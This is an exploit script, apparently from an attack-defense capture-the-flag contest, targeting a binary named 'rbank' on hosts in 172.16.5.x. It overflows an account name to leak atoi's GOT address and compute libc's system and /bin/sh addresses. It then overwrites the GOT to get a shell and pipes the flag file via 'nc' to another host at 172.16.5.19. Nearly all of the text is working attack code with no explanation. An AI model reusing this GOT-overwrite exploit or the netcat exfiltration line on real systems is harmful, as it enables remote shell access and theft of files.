#!/usr/bin/env python
# coding:utf-8

from ctf import *

context.log_level = 'error'

io = remote('172.16.5.{}'.format(args['ID']), 8888)
# io = process('./rbank')
# io = remote('0.0.0.0', 4000)

elf = ELF('./rbank')
libc = ELF('./libc.so.6')
g_buf = 0x0804AB00
start_addr = 0x08048750

# create new 1
io.sendlineafter(':', 1)
io.sendline('wtf')
io.sendline(1)

# edit to over write name
io.sendlineafter(':', 2)
io.sendline('wtf')
io.sendline('c')
payload = cyclic(204)
payload += p32(elf.got['atoi'])
io.sendline(payload)

io.recvuntil('account name :')
name = io.recvline(keepends=False)
atoi_addr = u32(name[:4])
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
log.info('atoi address: {:#x}'.format(atoi_addr))
log.info('libc base address: {:#x}'.format(libc_base))
log.info('system address: {:#x}'.format(system_addr))
log.info('/bin/sh address: {:#x}'.format(binsh_addr))

io.sendlineafter(':', 2)
io.send(name + '\x00')
io.sendline('c')
io.sendline(p32(elf.plt['atoi'] + 6) + p32(system_addr))
io.sendline(2)
io.clean()
io.sendline('/bin/sh')

io.sendline('cat /home/flag/flag | nc 172.16.5.19 20007')

io.clean()
io.sendline('cat /home/flag/flag')
print io.recv()

# io.interactive()
